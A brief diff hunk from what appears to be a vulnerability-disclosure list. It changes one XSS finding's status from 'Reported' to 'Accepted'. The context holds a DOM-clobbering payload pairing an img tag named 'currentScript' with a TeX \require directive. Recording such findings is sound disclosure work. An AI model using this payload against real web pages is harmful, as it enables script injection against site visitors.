@@ -9,7 +9,7 @@
 + Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img> $$\require{tex}$$```
 + Impact: XSS
 + CVE: N/A
-+ Status: Reported
++ Status: Accepted
 + Foundby: TheHulk
 
 
